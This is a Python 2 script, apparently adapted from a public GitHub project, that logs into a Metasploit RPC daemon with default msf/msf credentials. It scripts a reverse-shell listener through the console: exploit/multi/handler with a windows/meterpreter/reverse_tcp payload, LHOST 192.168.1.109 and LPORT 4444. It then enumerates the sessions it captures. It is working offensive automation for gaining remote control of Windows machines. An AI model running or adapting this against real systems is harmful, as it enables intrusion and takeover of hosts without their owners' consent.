#!/usr/bin/env python
#Credit goes to Luis Hebendanz
#https://github.com/Luis-Hebendanz/msf-remote-console
from __future__ import print_function
try:
    import time
    import sys
    import socket
    from ssl import SSLError
    from threading import Timer, Lock
except ImportError as msg:
    print ("[-] Library not installed: " + str(msg))
    print ("[*] Try installing it with: pip install " + str(msg.message))
    sys.exit()

try:
    try:
      import readline
    except ImportError:
      import pyreadline as readline
except ImportError:
    print ("[-] Readline module is not installed!")
    print ("[*] Install on Linux with: pip install readline")
    print ("[*] Install on Windows with: pip install pyreadline")
    sys.exit()

try:
    from metasploit.msfrpc import MsfRpcError, MsfRpcClient
    from metasploit.msfconsole import MsfRpcConsole
    from connectMsfRpcClient import connectMsfRpcClient
except ImportError as msg:
    print ("[-] Missing library pymetasploit")
    print ("[*] Please clone from \"git clone https://github.com/allfro/pymetasploit.git pymetasploit\"")
    print ("[*] \"cd pymetasploit && sudo python setup.py install\"")
    sys.exit()

class pyRon:
    # Conditonals
    emptyPasswordChoice = ''
    setSSL = ''

    # Object
    msfclient = None

    def __init__(self):
        # Adding Customization OR using defaults       
        try:
            useDefaults = raw_input("[DEFAULTS] Would you like to use the all defaults? y/n: ").upper()
            if useDefaults == 'Y':
                self.username = 'msf'
                self.password = 'msf'
                self.port = 55553
                self.host = "127.0.0.1"
                self.ssl = True
            elif useDefaults == 'N':
                print ('Press enter for individual defaults')
                self.username = raw_input('[Set Username] Please enter the username: ')
                if self.username == '':
                    print ('[Set Username] Using default username: msf')
                    self.username = 'msf'
                self.password = raw_input('[Set Password] Please enter the password: ')
                if self.password == '':
                    self.emptyPasswordChoice == raw_input('[Set Password] Would you like to set an empty password? y/n: ').upper()
                    if self.emptyPasswordChoice == 'Y':
                        self.password = ''
                    elif self.emptyPasswordChoice == 'N':
                        print ('[Set Password] Using default password: msf')
                        self.password = 'msf'
                self.port = raw_input('[Set Port] Please enter the port: ')
                if self.port == '':
                    print('[Set Port] Using default port: 55553')
                    self.port = 55553
                else:
                    self.port = int(self.port)
                self.host = raw_input('[Set Host] Please select the host: ')
                if self.host == '':
                    print ('[Set Host] Using default host: 127.0.0.1')
                    self.host = '127.0.0.1'
                setSSL = raw_input('[Set SSL] Using ssl? t/F: ').upper()
                if setSSL == '':
                    print ('[Set SSL] Using default: True')
                    self.ssl = True
                elif setSSL == "T":
                    print ('[Set SSL] Setting SSL to True')
                    self.ssl = True
                elif setSSL == "F":
                    print ('[Set SSL] Setting SSL to False')
                    self.ssl = False
        except ValueError:
            print ('Wrong input!')
            sys.exit()

        # Objects
        self.msfclient = connectMsfRpcClient(self.username, self.password, self.port, self.host, self.ssl)

        # Connect to msfrpcd
        if self.msfclient.connect() is False:
            sys.exit()

        # Testing sending commands to console to run
        self.msfclient.console.write('use exploit/multi/handler')
        time.sleep(2)
        self.msfclient.console.write('use windows/meterpreter/reverse_tcp')
        time.sleep(2)
        self.msfclient.console.write('set LHOST 192.168.1.109')
        time.sleep(2)
        self.msfclient.console.write('set LPORT 4444')
        time.sleep(2)
        self.msfclient.console.write('set THREADS 20')
        time.sleep(2)
        self.msfclient.console.write('run')
        time.sleep(10)

        # Only works if you load msgrpc with the correct parameters using the framework
        # Params: Pass=password, default port is 55552
        self.sessions = self.msfclient.client.sessions.list
        for s_id, s_info in self.sessions.items():
            print("\nSession ID: ", s_id)
            
            for key in s_info:
                print(key + ':', s_info[key])

# Execute Main
try:
    pyRon()
except KeyboardInterrupt:
    print ("[*] Interrpted execution")
    exit(0)